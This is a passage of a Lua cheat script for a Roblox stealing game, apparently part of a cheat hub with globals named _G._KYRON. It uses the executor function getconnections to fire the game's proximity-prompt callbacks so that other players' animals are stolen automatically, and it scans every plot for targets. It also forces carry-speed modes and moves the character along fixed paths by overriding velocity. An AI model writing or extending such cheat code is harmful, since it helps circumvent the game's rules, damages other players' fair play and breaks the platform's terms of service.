                if ok and type(result) == "table" then
                  for _, v78 in ipairs(result) do
                    if type(v78.Function) == "function" then
                      table.insert(tbl38.holdCallbacks, v78.Function)
                    end
                  end
                end

                local ok2, result2 = pcall(getconnections, arg.Triggered)

                if ok2 and type(result2) == "table" then
                  for _, v78 in ipairs(result2) do
                    if type(v78.Function) == "function" then
                      table.insert(tbl38.triggerCallbacks, v78.Function)
                    end
                  end
                end
              end

              if #tbl38.holdCallbacks > 0 or #tbl38.triggerCallbacks > 0 then
                stealController.InternalStealCache[arg] = tbl38
              end
            end

            fn50 = function(arg, arg2)
              if not arg or not arg.Parent or not arg2 then
                return false
              end

              if stealController.StealState.active then
                return false
              end

              if tick() - (stealController.StealState.lastResultTime or 0) < stealController.CFG.COOLDOWN then
                return false
              end
              fn52(arg)
              local v78 = stealController.InternalStealCache[arg]
              if not v78 or not v78.ready then
                return false
              end

              if tween then
                tween:Cancel()
                tween = nil
              end

              v78.ready = false
              stealController.StealState.active = true
              stealController.StealState.startTime = tick()
              stealController.StealState.phase = "stealing"
              stealController.StealState.label = arg2.name or "Animal"
              flag16 = true
              n33 += 1
              local v79 = n33
              local startTime = stealController.StealState.startTime
              local holdMin = stealController.CFG.HOLD_MIN
              local holdMax = stealController.CFG.HOLD_MAX
              textLabel.Text = "0%"
              frame.Size = UDim2.fromScale(0, 1)
              uiStroke.Color = color

              if connection2 then
                connection2:Disconnect()
              end

              local connection3 = nil

              connection3 = RunService.Heartbeat:Connect(function()
                if v79 ~= n33 or not stealController.StealState.active then
                  connection3:Disconnect()

                  if connection2 == connection3 then
                    connection2 = nil
                  end

                  return
                end

                local n34 = math.clamp((tick() - startTime) / holdMin, 0, 1)
                frame.Size = UDim2.fromScale(n34, 1)
                textLabel.Text = math.floor(n34 * 100) .. "%"
              end)

              connection2 = connection3

              task.spawn(function()
                local v80 = false

                for _, holdCallback in ipairs(v78.holdCallbacks) do
                  task.spawn(function()
                    pcall(holdCallback)
                  end)
                end

                while true do
                  if stealController.enabled and autoStealSettings.AutoSteal and _G._KYRONStealMode == "SEMI" and v79 == n33 and tick() - startTime < holdMin then
                    local primeRange = stealController.CFG.PRIME_RANGE
                    if not (fn51(arg2) > primeRange) then
                      task.wait()
                      continue
                    end
                  end

                  break
                end

                local flag17 = v79 ~= n33 or not stealController.enabled or not autoStealSettings.AutoSteal

                if not flag17 then
                  local primeRange = stealController.CFG.PRIME_RANGE
                  flag17 = fn51(arg2) > primeRange
                end

                if flag17 then
                  if v79 == n33 then
                    stealController.StealState.active = false
                    stealController.StealState.phase = "idle"
                    flag16 = false

                    if connection2 == connection3 then
                      connection2:Disconnect()
                      connection2 = nil
                    end

                    fn39()
                  end

                  v78.ready = true
                  return
                end

                stealController.StealState.phase = "waitingRange"
                local stealRange = stealController.CFG.STEAL_RANGE
                local flag18 = fn51(arg2) <= stealRange

                while stealController.enabled and autoStealSettings.AutoSteal and _G._KYRONStealMode == "SEMI" and v79 == n33 and arg.Parent do
                  local stealState, lastResult

                  if holdMax < tick() - startTime then
                    if v79 ~= n33 then
                      v78.ready = true
                      return
                    end
                    stealState = stealController.StealState
                    lastResult = v80 and "Stole " .. tostring(stealController.StealState.label) or "Missed: " .. tostring(stealController.StealState.label)
                    stealState.lastResult = lastResult
                    stealController.StealState.active = false
                    stealController.StealState.phase = "idle"
                    stealController.StealState.lastResultTime = tick()
                    flag16 = false

                    if connection2 == connection3 then
                      connection2:Disconnect()
                      connection2 = nil
                    end

                    if v80 then
                      frame.Size = UDim2.fromScale(1, 1)
                      textLabel.Text = "100%"
                    else
                      fn39()
                    end

                    task.wait(stealController.CFG.COOLDOWN)
                    v78.ready = true
                    if v79 ~= n33 then
                      return
                    end
                    fn39()
                    return
                  end

                  local v81 = fn51(arg2)

                  if v81 <= stealController.CFG.STEAL_RANGE then
                    if not flag18 then
                      task.wait(stealController.CFG.ENTRY_DELAY)
                    end

                    if v79 == n33 and stealController.enabled and autoStealSettings.AutoSteal and _G._KYRONStealMode == "SEMI" then
                      frame.Size = UDim2.fromScale(1, 1)
                      textLabel.Text = "100%"

                      for _, triggerCallback in ipairs(v78.triggerCallbacks) do
                        task.spawn(function()
                          pcall(triggerCallback)
                        end)
                      end

                      pcall(function()
                        if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then
                          _G.AutoCarrySpeed.WatchPickup(1.25)
                        end
                      end)

                      v80 = true
                      if v79 ~= n33 then
                        v78.ready = true
                        return
                      end
                      stealState = stealController.StealState
                      lastResult = v80 and "Stole " .. tostring(stealController.StealState.label) or "Missed: " .. tostring(stealController.StealState.label)
                      stealState.lastResult = lastResult
                      stealController.StealState.active = false
                      stealController.StealState.phase = "idle"
                      stealController.StealState.lastResultTime = tick()
                      flag16 = false

                      if connection2 == connection3 then
                        connection2:Disconnect()
                        connection2 = nil
                      end

                      if v80 then
                        frame.Size = UDim2.fromScale(1, 1)
                        textLabel.Text = "100%"
                      else
                        fn39()
                      end

                      task.wait(stealController.CFG.COOLDOWN)
                      v78.ready = true
                      if v79 ~= n33 then
                        return
                      end
                      fn39()
                      return
                    end

                    if v79 ~= n33 then
                      v78.ready = true
                      return
                    end
                    stealState = stealController.StealState
                    lastResult = v80 and "Stole " .. tostring(stealController.StealState.label) or "Missed: " .. tostring(stealController.StealState.label)
                    stealState.lastResult = lastResult
                    stealController.StealState.active = false
                    stealController.StealState.phase = "idle"
                    stealController.StealState.lastResultTime = tick()
                    flag16 = false

                    if connection2 == connection3 then
                      connection2:Disconnect()
                      connection2 = nil
                    end

                    if v80 then
                      frame.Size = UDim2.fromScale(1, 1)
                      textLabel.Text = "100%"
                    else
                      fn39()
                    end

                    task.wait(stealController.CFG.COOLDOWN)
                    v78.ready = true
                    if v79 ~= n33 then
                      return
                    end
                    fn39()
                    return
                  end

                  if v81 > stealController.CFG.PRIME_RANGE then
                    if v79 ~= n33 then
                      v78.ready = true
                      return
                    end
                    stealState = stealController.StealState
                    lastResult = v80 and "Stole " .. tostring(stealController.StealState.label) or "Missed: " .. tostring(stealController.StealState.label)
                    stealState.lastResult = lastResult
                    stealController.StealState.active = false
                    stealController.StealState.phase = "idle"
                    stealController.StealState.lastResultTime = tick()
                    flag16 = false

                    if connection2 == connection3 then
                      connection2:Disconnect()
                      connection2 = nil
                    end

                    if v80 then
                      frame.Size = UDim2.fromScale(1, 1)
                      textLabel.Text = "100%"
                    else
                      fn39()
                    end

                    task.wait(stealController.CFG.COOLDOWN)
                    v78.ready = true
                    if v79 ~= n33 then
                      return
                    end
                    fn39()
                    return
                  end

                  task.wait()
                end

                if v79 ~= n33 then
                  v78.ready = true
                  return
                end
                stealController.StealState.lastResult = v80 and "Stole " .. tostring(stealController.StealState.label) or "Missed: " .. tostring(stealController.StealState.label)
                stealController.StealState.active = false
                stealController.StealState.phase = "idle"
                stealController.StealState.lastResultTime = tick()
                flag16 = false

                if connection2 == connection3 then
                  connection2:Disconnect()
                  connection2 = nil
                end

                if v80 then
                  frame.Size = UDim2.fromScale(1, 1)
                  textLabel.Text = "100%"
                else
                  fn39()
                end

                task.wait(stealController.CFG.COOLDOWN)
                v78.ready = true
                if v79 ~= n33 then
                  return
                end
                fn39()
              end)

              return true
            end
          end
        end

        refreshAnimalCache = function()
          if not stealController.plots or not stealController.AnimalsData then
            return 0
          end
          local allAnimalsCache = {}

          for _, child in ipairs(stealController.plots:GetChildren()) do
            local v78 = stealController.plotSync.caches[child.Name]

            if v78 then
              local animalList = v78.AnimalList

              if typeof(animalList) == "table" then
                for k, v79 in pairs(animalList) do
                  if type(v79) == "table" then
                    local index = v79.Index
                    local v81 = stealController.AnimalsData[index]

                    if v81 then
                      table.insert(allAnimalsCache, {
                        name = v81.DisplayName or index,
                        plot = child.Name,
                        slot = tostring(k),
                        uid = child.Name .. "_" .. tostring(k),
                      })
                    end
                  end
                end
              end
            end
          end

          stealController.allAnimalsCache = allAnimalsCache
          return #allAnimalsCache
        end

        do
          local fn51 = nil

          local function fn52()
            if stealController.stealConn then
              return
            end

            if not fn46() then
              return
            end
            stealController.enabled = true
            refreshAnimalCache()

            if not stealController.scanThread then
              stealController.scanThread = task.spawn(function()
                while stealController.enabled do
                  pcall(refreshAnimalCache)
                  task.wait(5)
                end

                stealController.scanThread = nil
              end)
            end

            stealController.stealConn = RunService.Heartbeat:Connect(function()
              if not stealController.enabled or not autoStealSettings.AutoSteal then
                return
              end

              if _G._KYRONStealMode ~= "SEMI" then
                fn51()
                return
              end

              if stealController.StealState.active then
                return
              end
              local v78 = fn49()
              if not v78 then
                return
              end
              local v79 = stealController.PromptMemoryCache[v78.uid]

              if not v79 or not v79.Parent then
                v79 = fn48(v78)
              end

              if v79 then
                fn50(v79, v78)
              end
            end)
          end

          fn51 = function()
            stealController.enabled = false
            n33 += 1

            if stealController.stealConn then
              stealController.stealConn:Disconnect()
              stealController.stealConn = nil
            end

            stealController.StealState.active = false
            stealController.StealState.phase = "idle"
            flag16 = false

            if connection2 then
              connection2:Disconnect()
              connection2 = nil
            end

            fn39()
          end

          syncStealMode = function()
            if _G._KYRONStealMode == "SEMI" then
              fn45()
              fn52()
            else
              fn51()
              fn44()
            end
          end

          stopAllStealAutomation = function()
            fn45()
            fn51()
          end
        end
      end

      do
        do
          do
            if _G._KYRONRagdollStealEnabled == nil then
              _G._KYRONRagdollStealEnabled = true
            end

            do
              local function fn44()
                local KYRONNormalStealRagdollState = _G._KYRONNormalStealRagdollState

                if KYRONNormalStealRagdollState and KYRONNormalStealRagdollState.Destroy then
                  pcall(KYRONNormalStealRagdollState.Destroy)
                end

                local KYRONNormalStealRagdollState2 = { active = false, token = 0, humanoid = nil, conns = {} }
                _G._KYRONNormalStealRagdollState = KYRONNormalStealRagdollState2
                _G._KYRONNormalStealRagdollPaused = false

                local function fn45(arg)
                  local v78 = KYRONNormalStealRagdollState2.conns[arg]

                  if v78 then
                    pcall(function()
                      v78:Disconnect()
                    end)

                    KYRONNormalStealRagdollState2.conns[arg] = nil
                  end
                end

                local function fn46(arg)
                  if not arg then
                    return false
                  end
                  local state = arg:GetState()
                  return state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll
                end

                local function fn47()
                  local character = localPlayer.Character
                  local KYRONStealBarMedusaPart = _G._KYRONStealBarMedusaPart
                  if KYRONStealBarMedusaPart and KYRONStealBarMedusaPart.Parent and character and KYRONStealBarMedusaPart:IsDescendantOf(character) and KYRONStealBarMedusaPart.Anchored then
                    return 1.2
                  end
                  return 1.45
                end

                local function fn48(arg)
                  KYRONNormalStealRagdollState2.token = KYRONNormalStealRagdollState2.token + 1
                  KYRONNormalStealRagdollState2.active = false
                  _G._KYRONNormalStealRagdollPaused = false

                  if arg and autoStealSettings.AutoSteal then
                    pcall(syncStealMode)
                  end
                end

                local function fn49()
                  local humanoid = KYRONNormalStealRagdollState2.humanoid
                  if not humanoid or not humanoid.Parent then
                    return
                  end

                  if _G._KYRONRagdollStealEnabled ~= true then
                    if KYRONNormalStealRagdollState2.active then
                      fn48(true)
                    end

                    return
                  end

                  if not autoStealSettings.AutoSteal then
                    if KYRONNormalStealRagdollState2.active then
                      fn48(false)
                    end

                    return
                  end

                  if fn46(humanoid) and not KYRONNormalStealRagdollState2.active then
                    KYRONNormalStealRagdollState2.active = true
                    KYRONNormalStealRagdollState2.token = KYRONNormalStealRagdollState2.token + 1
                    local token = KYRONNormalStealRagdollState2.token
                    _G._KYRONNormalStealRagdollPaused = true
                    pcall(stopAllStealAutomation)

                    task.delay(fn47(), function()
                      if KYRONNormalStealRagdollState2.token ~= token or not KYRONNormalStealRagdollState2.active then
                        return
                      end
                      _G._KYRONNormalStealRagdollPaused = false
                      KYRONNormalStealRagdollState2.active = false

                      if _G._KYRONRagdollStealEnabled == true and autoStealSettings.AutoSteal then
                        pcall(syncStealMode)
                      end
                    end)
                  end
                end

                local function fn50(character)
                  fn45("state")

                  if KYRONNormalStealRagdollState2.active then
                    fn48(false)
                  end

                  local humanoid = character and (character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 10))
                  KYRONNormalStealRagdollState2.humanoid = humanoid
                  if not humanoid then
                    return
                  end
                  KYRONNormalStealRagdollState2.conns.state = humanoid.StateChanged:Connect(fn49)
                  task.defer(fn49)
                end

                KYRONNormalStealRagdollState2.Destroy = function()
                  fn48(false)
                  fn45("state")
                  fn45("character")
                  KYRONNormalStealRagdollState2.humanoid = nil
                end

                KYRONNormalStealRagdollState2.SetEnabled = function(arg)
                  _G._KYRONRagdollStealEnabled = arg == true

                  if not _G._KYRONRagdollStealEnabled then
                    if KYRONNormalStealRagdollState2.active then
                      fn48(true)
                    end
                  else
                    task.defer(fn49)
                  end

                  return _G._KYRONRagdollStealEnabled
                end

                KYRONNormalStealRagdollState2.conns.character = localPlayer.CharacterAdded:Connect(fn50)

                if localPlayer.Character then
                  task.defer(fn50, localPlayer.Character)
                end
              end

              fn44()
            end
          end

          do
            Vector3.new()

            autoPathState = {
              L = false,
              R = false,
              lRef = nil,
              rRef = nil,
              startL = nil,
              stopL = nil,
              startR = nil,
              stopR = nil,
            }

            _G._KYRONAutoPathActive = false

            if type(_G._KYRONStopAutoCarry) == "function" then
              pcall(_G._KYRONStopAutoCarry)
            end

            do
              local function fn44()
                local tbl38 = {
                  active = false,
                  previous = nil,
                  stealConn = nil,
                  charConn = nil,
                  nearConn = nil,
                  nextNearScan = 0,
                }

                local function fn45()
                  if _G._KYRONRefreshMovementModes then
                    pcall(_G._KYRONRefreshMovementModes)
                  end

                  if _G._KYRONSyncMobile then
                    pcall(_G._KYRONSyncMobile)
                  end
                end

                local function fn46()
                  if not tbl38.active then
                    return
                  end
                  local previous = tbl38.previous
                  local v78 = tbl38
                  tbl38.active = false
                  v78.previous = nil

                  if previous then
                    local v79 = movementSpeedSettings
                    local carry = previous.carry
                    movementSpeedSettings.family = previous.family
                    v79.carry = carry
                  end

                  fn45()
                end

                local function fn47(arg)
                  if autoPathState.L or autoPathState.R then
                    local v78 = tbl38
                    tbl38.active = false
                    v78.previous = nil
                    return
                  end

                  if not _G._KYRONAutoCarry or not arg then
                    fn46()
                    return
                  end

                  if tbl38.active then
                    if tbl38.previous and movementSpeedSettings.family ~= tbl38.previous.family then
                      tbl38.previous = { family = movementSpeedSettings.family, carry = false }
                    end

                    if not movementSpeedSettings.carry then
                      movementSpeedSettings.carry = true
                      fn45()
                    end

                    return
                  end

                  tbl38.previous = {
                    family = movementSpeedSettings.family,
                    carry = movementSpeedSettings.carry,
                  }
                  tbl38.active = true
                  movementSpeedSettings.carry = true
                  fn45()
                end

                local function fn48()
                  fn47(localPlayer:GetAttribute("Stealing") == true)
                end

                local function fn49()
                  local flag17 = localPlayer:GetAttribute("Stealing") == true
                  local flag18 = false

                  if not flag17 then
                    local v78
                    v78, v78 = fn43()
                    flag18 = v78 ~= nil and v78 <= 10
                  end

                  fn47(flag17 or flag18)
                end

                local function fn50()
                  if tbl38.stealConn then
                    tbl38.stealConn:Disconnect()
                    tbl38.stealConn = nil
                  end

                  if tbl38.charConn then
                    tbl38.charConn:Disconnect()
                    tbl38.charConn = nil
                  end

                  if tbl38.nearConn then
                    tbl38.nearConn:Disconnect()
                    tbl38.nearConn = nil
                  end
                end

                -- Extra Auto Carry modes.
                local KYRONAutoCarrySpeedState = {
                  active = false,
                  previousFamily = nil,
                  previousCarry = nil,
                  conn = nil,
                }

                local KYRONAutoCarryEnemyBaseState = {
                  active = false,
                  previousFamily = nil,
                  previousCarry = nil,
                  conn = nil,
                }

                local function KYRONIsCarryingBrainrot(character)
                  if not character then
                    return false
                  end

                  for _, name in ipairs({
                    "Carrying", "IsCarrying", "Grabbed", "Holding",
                    "StealHold", "HasGrab", "HoldingBrainrot", "HasBrainrot",
                  }) do
                    local ok, value = pcall(function()
                      return localPlayer:GetAttribute(name)
                    end)
                    if ok and value == true then
                      return true
                    end

                    local ok2, charValue = pcall(function()
                      return character:GetAttribute(name)
                    end)
                    if ok2 and charValue == true then
                      return true
                    end

                    local valueObject = character:FindFirstChild(name, true)
                    if valueObject then
                      if valueObject:IsA("BoolValue") and valueObject.Value then
                        return true
                      elseif valueObject:IsA("ObjectValue") and valueObject.Value then
                        return true
                      elseif valueObject:IsA("StringValue") and valueObject.Value ~= "" then
                        return true
                      end
                    end
                  end

                  -- Stealing is also treated as the carry transition so the
                  -- speed changes immediately, before the held object appears.
                  if localPlayer:GetAttribute("Stealing") == true then
                    return true
                  end

                  for _, child in ipairs(character:GetChildren()) do
                    if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
                      local name = tostring(child.Name):lower()
                      if name:find("brainrot") or name:find("animal") or name:find("carry")
                        or name:find("grab") or name:find("hold") or name:find("steal") then
                        return true
                      end
                    elseif child:IsA("Tool") then
                      local name = tostring(child.Name):lower()
                      if not (name:find("bat") or name:find("slap") or name:find("medusa")
                        or name:find("head") or name:find("stone")) then
                        return true
                      end
                    end
                  end

                  return false
                end

                local function KYRONApplyForcedCarry(state)
                  if not state.active then
                    state.previousFamily = movementSpeedSettings.family
                    state.previousCarry = movementSpeedSettings.carry
                    state.active = true
                  end

                  movementSpeedSettings.family = "normal"
                  movementSpeedSettings.carry = true
                  if _G._KYRONRefreshMovementModes then
                    pcall(_G._KYRONRefreshMovementModes)
                  end
                  if _G._KYRONSyncMobile then
                    pcall(_G._KYRONSyncMobile)
                  end
                end

                local function KYRONReleaseForcedCarry(state)
                  if not state.active then
                    return
                  end

                  local previousFamily = state.previousFamily or "normal"
                  local previousCarry = state.previousCarry == true
                  state.active = false
                  state.previousFamily = nil
                  state.previousCarry = nil

                  -- Do not overwrite a newer manual/Auto Carry selection.
                  if not _G._KYRONAutoCarry and not _G._KYRONAutoCarrySpeedEnabled
                    and not _G._KYRONAutoCarryEnemyBaseEnabled then
                    movementSpeedSettings.family = previousFamily
                    movementSpeedSettings.carry = previousCarry
                  elseif previousFamily == "lagger" then
                    movementSpeedSettings.family = "lagger"
                    movementSpeedSettings.carry = previousCarry
                  end

                  if _G._KYRONRefreshMovementModes then
                    pcall(_G._KYRONRefreshMovementModes)
                  end
                  if _G._KYRONSyncMobile then
                    pcall(_G._KYRONSyncMobile)
                  end
                end

                local function KYRONIsNearEnemyBase(range)
                  local character = localPlayer.Character
                  local root = character and character:FindFirstChild("HumanoidRootPart")
                  local plots = workspace:FindFirstChild("Plots")
                  if not root or not plots then
                    return false
                  end

                  local myPosition = root.Position
                  local maxRange = tonumber(range) or 35

                  for _, plot in ipairs(plots:GetChildren()) do
                    if plot:IsA("Model") and not fn40(plot.Name) then
                      local position
                      local ok, pivot = pcall(function()
                        return plot:GetPivot().Position
                      end)
                      if ok and pivot then
                        position = pivot
                      else
                        local sign = plot:FindFirstChild("PlotSign")
                        if sign and sign:IsA("BasePart") then
                          position = sign.Position
                        elseif sign then
                          local part = sign:FindFirstChildWhichIsA("BasePart", true)
                          if part then
                            position = part.Position
                          end
                        end
                      end

                      if position then
                        local flat = Vector3.new(myPosition.X - position.X, 0, myPosition.Z - position.Z)
                        if flat.Magnitude <= maxRange then
                          return true
                        end
                      end
                    end
                  end

                  return false
                end

                _G._KYRONStartAutoCarrySpeed = function()
                  if KYRONAutoCarrySpeedState.conn then
                    return
                  end

                  KYRONAutoCarrySpeedState.conn = RunService.Heartbeat:Connect(function()
                    if not _G._KYRONAutoCarrySpeedEnabled then
                      KYRONReleaseForcedCarry(KYRONAutoCarrySpeedState)
                      return
                    end

                    local character = localPlayer.Character
                    if not character then
                      KYRONReleaseForcedCarry(KYRONAutoCarrySpeedState)
                      return
                    end

                    if KYRONIsCarryingBrainrot(character) then
                      KYRONApplyForcedCarry(KYRONAutoCarrySpeedState)
                    else
                      KYRONReleaseForcedCarry(KYRONAutoCarrySpeedState)
                    end
                  end)
                end

                _G._KYRONStopAutoCarrySpeed = function()
                  if KYRONAutoCarrySpeedState.conn then
                    pcall(function() KYRONAutoCarrySpeedState.conn:Disconnect() end)
                    KYRONAutoCarrySpeedState.conn = nil
                  end
                  KYRONReleaseForcedCarry(KYRONAutoCarrySpeedState)
                end

                _G._KYRONStartAutoCarryEnemyBase = function()
                  if KYRONAutoCarryEnemyBaseState.conn then
                    return
                  end

                  KYRONAutoCarryEnemyBaseState.conn = RunService.Heartbeat:Connect(function()
                    if not _G._KYRONAutoCarryEnemyBaseEnabled then
                      KYRONReleaseForcedCarry(KYRONAutoCarryEnemyBaseState)
                      return
                    end

                    if KYRONIsNearEnemyBase(_G._KYRONAutoCarryEnemyBaseRange) then
                      KYRONApplyForcedCarry(KYRONAutoCarryEnemyBaseState)
                    else
                      KYRONReleaseForcedCarry(KYRONAutoCarryEnemyBaseState)
                    end
                  end)
                end

                _G._KYRONStopAutoCarryEnemyBase = function()
                  if KYRONAutoCarryEnemyBaseState.conn then
                    pcall(function() KYRONAutoCarryEnemyBaseState.conn:Disconnect() end)
                    KYRONAutoCarryEnemyBaseState.conn = nil
                  end
                  KYRONReleaseForcedCarry(KYRONAutoCarryEnemyBaseState)
                end

                -- Auto-carry and movement-path controllers.
                _G._KYRONStartAutoCarry = function()
                  fn50()
                  fn46()

                  tbl38.charConn = localPlayer.CharacterAdded:Connect(function()
                    fn46()
                  end)

                  if _G._KYRONAutoCarryMode == "WHEN NEAR" then
                    tbl38.nearConn = RunService.Heartbeat:Connect(function()
                      local now3 = os.clock()
                      if now3 < tbl38.nextNearScan then
                        return
                      end
                      tbl38.nextNearScan = now3 + 0.08
                      fn49()
                    end)

                    fn49()
                  else
                    tbl38.stealConn = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(fn48)
                    fn48()
                  end
                end

                _G._KYRONStopAutoCarry = function()
                  fn50()
                  fn46()
                end

                _G._KYRONSyncAutoCarry = function()
                  if not _G._KYRONAutoCarry then
                    return
                  end

                  if _G._KYRONAutoCarryMode == "WHEN NEAR" then
                    fn49()
                  else
                    fn48()
                  end
                end

                _G._KYRONAutoCarrySelectFamily = function(family, arg)
                  if family ~= "normal" and family ~= "lagger" then
                    return false
                  end

                  if not tbl38.active then
                    return false
                  end
                  tbl38.previous = { family = family, carry = arg == true }
                  movementSpeedSettings.family = family
                  movementSpeedSettings.carry = true
                  fn45()
                  return true
                end
              end

              fn44()
            end
          end

          do
            local function fn44()
              local vector = Vector3.new(-476.48, -6.28, 94.87)
              local vector2 = Vector3.new(-483.12, -6.46, 25.13)
              local vector3 = Vector3.new(-483.12, -6.52, 25.62)
              local vector4 = Vector3.new(-483.06, -5.03, 25.48)
              local connection3 = nil
              local connection4 = nil
              local n34 = 1
              local n35 = 1

              local function fn45()
                if _G._KYRONRefreshMovementModes then
                  _G._KYRONRefreshMovementModes()
                end

                if _G._KYRONSyncMobile then
                  _G._KYRONSyncMobile()
                end
              end

              local function fn46()
                -- Auto Left/Right must not change the user's selected speed mode.
                -- Keep the current Normal / Carry / Lagger selection untouched.
                fn45()
              end

              local function fn47()
                local character = localPlayer.Character
                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                local v78 = character and character:FindFirstChildOfClass("Humanoid")

                if v78 then
                  v78:Move(Vector3.zero, false)
                end

                if humanoidRootPart then
                  humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, humanoidRootPart.AssemblyLinearVelocity.Y, 0)
                end

                fn46(true)
                _G._KYRONAutoPathActive = autoPathState.L or autoPathState.R

                task.defer(function()
                  if type(_G._KYRONSyncAutoCarry) == "function" then
                    pcall(_G._KYRONSyncAutoCarry)
                  end

                  if type(saveKYRONSettings) == "function" then
                    pcall(saveKYRONSettings)
                  end
                end)
              end

              autoPathState.stopL = function()
                if connection3 then
                  connection3:Disconnect()
                  connection3 = nil
                end

                n34 = 1
                autoPathState.L = false

                if autoPathState.lRef and autoPathState.lRef.setState then
                  autoPathState.lRef.setState(false)
                end

                if _G._KYRONSetMobileBtn then
                  _G._KYRONSetMobileBtn("autoRight", false)
                end

                fn47()
              end

              autoPathState.stopR = function()
                if connection4 then
                  connection4:Disconnect()
                  connection4 = nil
                end

                n35 = 1
                autoPathState.R = false

                if autoPathState.rRef and autoPathState.rRef.setState then
                  autoPathState.rRef.setState(false)
                end

                if _G._KYRONSetMobileBtn then
                  _G._KYRONSetMobileBtn("autoRight", false)
                end

                fn47()
              end

              autoPathState.startL = function()
                if autoPathState.R then
                  autoPathState.stopR()
                end

                if connection3 then
                  connection3:Disconnect()
                end

                n34 = 1
                autoPathState.L = true
                _G._KYRONAutoPathActive = true
                fn46()

                connection3 = RunService.Heartbeat:Connect(function()
                  if not autoPathState.L then
                    return
                  end

                  -- Do not switch to Normal Speed while Auto Left is active.
                  local character = localPlayer.Character
                  if not character then
                    return
                  end
                  local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                  local v78 = character:FindFirstChildOfClass("Humanoid")
                  if not humanoidRootPart or not v78 then
                    return
                  end
                  local v79 = fn38()

                  if n34 == 1 then
                    local position = humanoidRootPart.Position
                    if (Vector3.new(vector.X, humanoidRootPart.Position.Y, vector.Z) - position).Magnitude < 3 then
                      n34 = 2
                      return
                    end
                    local n36 = vector - humanoidRootPart.Position
                    local vector5 = Vector3.new(n36.X, 0, n36.Z)

                    if vector5.Magnitude > 0.1 then
                      local unit = vector5.Unit
                      v78:Move(unit, false)

                      -- Ryzen-style movement: correct horizontal velocity with
                      -- mass-scaled ApplyImpulse instead of hard-setting
                      -- AssemblyLinearVelocity every frame.
                      local current = humanoidRootPart.AssemblyLinearVelocity
                      local target = Vector3.new(unit.X * v79, current.Y, unit.Z * v79)
                      local mass = humanoidRootPart.AssemblyMass
                      if not mass or mass ~= mass or mass <= 0 then
                        mass = 1
                      end

                      local gain = 0.85
                      local state = v78:GetState()
                      local grounded = state ~= Enum.HumanoidStateType.Freefall
                        and state ~= Enum.HumanoidStateType.Jumping

                      if grounded then
                        local origin = humanoidRootPart.Position + Vector3.new(0, 2, 0)
                        local params = RaycastParams.new()
                        params.FilterType = Enum.RaycastFilterType.Exclude
                        params.FilterDescendantsInstances = {character}
                        params.IgnoreWater = true

                        local hit = workspace:Raycast(
                          origin,
                          Vector3.new(0, -8, 0),
                          params
                        )

                        if hit and hit.Normal then
                          if hit.Normal.Y < 0.55 then
                            gain = 0.45
                          elseif hit.Normal.Y < 0.78 then
                            gain = 0.62
                          else
                            gain = 0.90
                          end
                        end
                      else
                        gain = 0.70
                      end

                      humanoidRootPart:ApplyImpulse((target - current) * mass * gain)
                    end
                  else
                    local position = humanoidRootPart.Position
                    if (Vector3.new(vector2.X, humanoidRootPart.Position.Y, vector2.Z) - position).Magnitude < 3 then
                      autoPathState.stopL()
                      return
                    end
                    local n36 = vector2 - humanoidRootPart.Position
                    local vector5 = Vector3.new(n36.X, 0, n36.Z)

                    if vector5.Magnitude > 0.1 then
                      local unit = vector5.Unit
                      v78:Move(unit, false)

                      -- Ryzen-style movement: correct horizontal velocity with
                      -- mass-scaled ApplyImpulse instead of hard-setting
                      -- AssemblyLinearVelocity every frame.
                      local current = humanoidRootPart.AssemblyLinearVelocity
                      local target = Vector3.new(unit.X * v79, current.Y, unit.Z * v79)
                      local mass = humanoidRootPart.AssemblyMass
                      if not mass or mass ~= mass or mass <= 0 then
                        mass = 1
                      end

                      local gain = 0.85
                      local state = v78:GetState()
                      local grounded = state ~= Enum.HumanoidStateType.Freefall
                        and state ~= Enum.HumanoidStateType.Jumping

                      if grounded then
                        local origin = humanoidRootPart.Position + Vector3.new(0, 2, 0)
                        local params = RaycastParams.new()
                        params.FilterType = Enum.RaycastFilterType.Exclude
                        params.FilterDescendantsInstances = {character}
                        params.IgnoreWater = true

                        local hit = workspace:Raycast(
                          origin,
                          Vector3.new(0, -8, 0),
                          params
                        )

                        if hit and hit.Normal then
                          if hit.Normal.Y < 0.55 then
                            gain = 0.45
                          elseif hit.Normal.Y < 0.78 then
                            gain = 0.62
                          else
                            gain = 0.90
                          end
                        end
                      else
                        gain = 0.70
                      end

                      humanoidRootPart:ApplyImpulse((target - current) * mass * gain)
                    end
                  end
                end)
              end

              autoPathState.startR = function()
                if autoPathState.L then
                  autoPathState.stopL()
                end

                if connection4 then
                  connection4:Disconnect()
                end

                n35 = 1
                autoPathState.R = true
                _G._KYRONAutoPathActive = true
                fn46()

                connection4 = RunService.Heartbeat:Connect(function()
                  if not autoPathState.R then
                    return
                  end

                  -- Do not switch to Normal Speed while Auto Right is active.
                  local character = localPlayer.Character
                  if not character then
                    return
                  end
                  local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                  local humanoid = character:FindFirstChildOfClass("Humanoid")
                  if not humanoidRootPart or not humanoid then
                    return
                  end
                  local v78 = fn38()

                  if n35 == 1 then
                    local position = humanoidRootPart.Position
                    if (Vector3.new(vector3.X, humanoidRootPart.Position.Y, vector3.Z) - position).Magnitude < 1.5 then
                      n35 = 2
                      return
                    end
                    local n36 = vector3 - humanoidRootPart.Position
                    local vector5 = Vector3.new(n36.X, 0, n36.Z)

                    if 0.4 < vector5.Magnitude then
                      local unit = vector5.Unit
                      humanoid:Move(unit, false)
                      humanoidRootPart.AssemblyLinearVelocity = Vector3.new(unit.X * v78, humanoidRootPart.AssemblyLinearVelocity.Y, unit.Z * v78)
                    end
                  else
                    local position = humanoidRootPart.Position
                    if (Vector3.new(vector4.X, humanoidRootPart.Position.Y, vector4.Z) - position).Magnitude < 1.5 then
                      autoPathState.stopR()
                      return
                    end
                    local n36 = vector4 - humanoidRootPart.Position
                    local vector5 = Vector3.new(n36.X, 0, n36.Z)

                    if vector5.Magnitude > 0.1 then
                      local unit = vector5.Unit
                      humanoid:Move(unit, false)

                      humanoidRootPart.AssemblyLinearVelocity = Vector3.new(unit.X * v78, humanoidRootPart.AssemblyLinearVelocity.Y, unit.Z * v78)
                    end
